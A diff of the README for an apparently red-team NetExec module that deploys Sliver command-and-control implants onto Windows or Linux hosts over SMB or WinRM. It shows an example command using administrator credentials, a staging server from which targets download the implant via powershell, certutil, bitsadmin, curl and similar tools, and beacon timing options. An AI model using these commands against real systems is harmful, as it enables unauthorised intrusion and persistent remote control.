@@ -152,10 +152,10 @@ nxc smb 10.2.10.10 -u localuser -p password \
 nxc winrm 192.168.1.10 -u Administrator -p 'P@ssw0rd!' \
   -M sliver_exec \
   -o RHOST=10.0.0.5 \
-     STAGING=True STAGER_PORT=8080
+     STAGING=http STAGING_PORT=8080
 ```
 
-*Note: `STAGING_METHOD` defaults to powershell, `STAGER_RHOST` defaults to `RHOST`*
+*Note: `DOWNLOAD_TOOL` defaults to powershell, `STAGER_RHOST` defaults to `RHOST`*
 
 **See [USAGE.md](docs/USAGE.md) for detailed examples and options.**
 
@@ -171,16 +171,20 @@ nxc winrm 192.168.1.10 -u Administrator -p 'P@ssw0rd!' \
 |--------|---------|-------------|
 | `RHOST` | **Required*** | Sliver mTLS listener IP |
 | `RPORT` | `443` | Sliver mTLS listener port (optional) |
-| `STAGING` | `False` | Enable staging mode |
+| `STAGING` | `False` | Staging mode: `http`, `tcp`, `https`, or `False` to disable |
 | `STAGER_RHOST` | `RHOST` | Staging server IP (defaults to same as RHOST) |
-| `STAGER_PORT` | `8080` | HTTP port for hosting implant (enables HTTP download staging) |
-| `STAGING_METHOD` | `powershell` | Download method: `powershell`, `certutil`, or `bitsadmin` |
+| `STAGING_PORT` | `8080` | HTTP port for hosting implant (HTTP download staging) |
+| `DOWNLOAD_TOOL` | `powershell` | Download method: `powershell`, `certutil`, `bitsadmin`, `wget`, `curl`, `python` |
+| `BEACON_INTERVAL` | `5` | Beacon callback interval in seconds |
+| `BEACON_JITTER` | `3` | Beacon callback jitter in seconds |
 | `OS` | Auto-detect | Target OS (`windows` or `linux`) |
 | `ARCH` | `amd64` | Target architecture |
 | `CLEANUP` | `True` | Remove artifacts after beacon callback |
 | `WAIT` | `90` | Seconds to wait for beacon |
 
 *\* Either `RHOST` or `PROFILE` must be provided*
+
+**Note:** Old option names (`STAGER_PORT`, `STAGING_METHOD`, `STAGING=True`) are still supported for backward compatibility.
 
 **Full option reference in [USAGE.md](docs/USAGE.md#advanced-options)**
 
